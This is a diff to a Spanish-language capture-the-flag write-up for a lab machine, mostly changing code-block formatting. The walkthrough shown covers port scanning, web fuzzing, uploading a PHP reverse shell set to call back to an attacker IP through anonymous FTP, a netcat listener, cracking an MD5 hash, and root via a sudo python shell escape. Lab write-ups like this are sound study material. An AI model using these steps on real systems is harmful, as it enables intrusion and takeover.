@@ -44,9 +44,8 @@ enumeración de directorios web, el uso de ftp vía Anonymous, establecimiento d
 Comenzamos con el reconocimiento, para ello lanzaremos un nmap que nos detecte todos los puertos abiertos con --open -p- y con la mayor rapidez posible, 
 lo exportaremos a un fichero en formato grepeable para mantener la información.
 
-```
+```zsh
 nmap --open -p- -T5 192.168.1.64 -oG puertos
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 16:23 CEST
 Nmap scan report for 192.168.1.64
 Host is up (0.00043s latency).
 Not shown: 65532 closed tcp ports (conn-refused)
@@ -61,9 +60,8 @@ Nmap done: 1 IP address (1 host up) scanned in 1.93 seconds
 
 <br>Una vez hemos obtenido los puertos abiertos de la máquina víctima, podemos realizar un escaneo a esos puertos concretos utilizando algunos scripts predeterminados de NMAP:
 
-```
--sCV -p 21,22,80 192.168.1.64 -Pn -oN Escaneo
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 16:45 CEST
+```zsh
+nmap -sCV -p 21,22,80 192.168.1.64 -Pn -oN Escaneo
 Nmap scan report for 192.168.1.64
 Host is up (0.00024s latency).
 
@@ -104,7 +102,7 @@ Como podemos ver, la pista nos insinúa que utilicemos alguna herramienta de rec
 
 ## WFUZZ
 
-```
+```zsh
 wfuzz -c --hc 404 -u http://192.168.1.64:80/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -151,7 +149,7 @@ En este punto creo que es interesante investigar el contenido del servidor conec
 
 Vamos a conectarnos al ftp utilizando las credenciales anonymous/anonymous.
 
-```
+```zsh
 ftp 192.168.1.64
 Connected to 192.168.1.64.
 220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.64]
@@ -179,7 +177,7 @@ podemos subir este archivo a través de ftp.
 Consultamos la Cheat Sheet de <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">Pentestmonkey</a>
 y adaptamos la shell con los parametros deseados:
 
-```
+```zsh
   47   │ set_time_limit (0);
   48   │ $VERSION = "1.0";
   49   │ $ip = '192.168.1.84';  // CHANGE THIS
@@ -194,7 +192,7 @@ y adaptamos la shell con los parametros deseados:
 
 <br>Subimos el archivo con la reverse shell al servidor:
 
-```
+```zsh
 ftp> put php-reverse-shell.php 
 local: php-reverse-shell.php remote: php-reverse-shell.php
 229 Entering Extended Passive Mode (|||30588|)
@@ -211,7 +209,7 @@ Antes de llamar al archivo para que se ejecute desde el navegador web nos pondre
 
 Para ello utilizaremos netcat:
 
-```
+```zsh
 ❯ nc -lvp 1234
 listening on [any] 1234 ...
 
@@ -219,7 +217,7 @@ listening on [any] 1234 ...
 
 <br>Una vez llamemos al archivo php malicioso desde el navegador recibiremos la shell.
 
-```
+```zsh
 ❯ nc -lvp 1234
 listening on [any] 1234 ...
 192.168.1.64: inverse host lookup failed: Unknown host
@@ -236,9 +234,9 @@ www-data
 
 ## Reconocimiento dentro del host
 
-Podemos intentar spawnear una TTY con: `python3 -c 'import pty; pty.spawn("/bin/sh")'`. Una vez tengamos una terminal decente para trabajar nos dirigimos a `/home/` y vemos el siguiente resultado.
+Podemos intentar spawnear una TTY con: `python3 -c 'import pty; pty.spawn("/bin/sh")'`{:.python}. Una vez tengamos una terminal decente para trabajar nos dirigimos a `/home/` y vemos el siguiente resultado.
 
-```
+```zsh
 $ cd home 
 cd home
 $ ls
@@ -249,7 +247,7 @@ important.txt  shrek
 Podemos deducir que existe un usuario shrek donde dentro de su directorio se encuentra la primera flag `user.txt`, pero no tenemos permisos de lectura. <br>
 <br>También podemos observar un fichero llamado `important.txt` si hacemos un cat para ver su contenido encontramos lo siguiente:
 
-```
+```zsh
 cat important.txt
 run the script to see the data
 
@@ -259,7 +257,7 @@ run the script to see the data
 
 <br>Si ejecutamos el script obtenemos lo siguiente:
 
-```
+```sh
 $ /.runme.sh
 /.runme.sh
 the secret key
@@ -288,7 +286,7 @@ Parece que hemos sido “troleados”, ¿no? Si nos fijamos podemos ver que se n
 
 ## Tipo de hash
 
-```
+```zsh
 ❯ hash-identifier cf4c2232354952690368f1b3dfdfb24d
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -314,7 +312,7 @@ Possible Hashs:
 Tenemos una coincidencia, MD5 parece ser el tipo correcto, teniendo el hash podemos intentar sacar la contraseña  sin estar haseada por medio de fuerza bruta, 
 usando el diccionario ya conocido `rockyou.txt`. Para ello utilizaremos Jonh donde le pasamos el tipo de hash y un fichero donde esté guardado el mismo.
 
-```
+```zsh
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash_shrek.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
@@ -351,9 +349,8 @@ shrek@ubuntu:~$
 <br>
 ¡Bingo! Tenemos acceso al usuario por lo que onion es una credencial correcta, vamos a buscar la primera flag ubicada en el diretorio personal de shrek.<br><br>
 
-
-```
-user.txt
+### User.txt
+```txt
 shrek@ubuntu:~$ cat user.txt 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
@@ -395,6 +392,7 @@ XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX
 XXXXXXXX.        'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   'XX
 
 invite-me: https://www.linkedin.com/in/eliastouguinho/
+
 ```
 Ya tenemos la primera flag, ahora a por la escalada de privilegios.
 
@@ -402,7 +400,7 @@ Ya tenemos la primera flag, ahora a por la escalada de privilegios.
 
 Para la escalada de privilegios vamos a probar con un típico sudo -l a ver que encontramos.
 
-```
+```zsh
 shrek@ubuntu:/home$ sudo -l
 Matching Defaults entries for shrek on ubuntu:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -414,7 +412,7 @@ User shrek may run the following commands on ubuntu:
 <br>Por lo que podemos ver el usuario shrek puede ejecutar como root gracias a sudo python3.5 por lo que podríamos escalar privilegios a través de python. Nos podemos ayudar de
 <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>.<br><br>
 
-```
+```zsh
 $ whoami
 shrek
 $ sudo python3.5 -c 'import os; os.system("/bin/sh")'  
@@ -425,7 +423,9 @@ root
 
 <br>¡Ya hemos conseguido acceso root! Ahora a por esa flag ubicada en '/root/'.
 
-```
+### Root.txt
+
+```txt
 # cat root.txt
                             ____
         ____....----''''````    |.
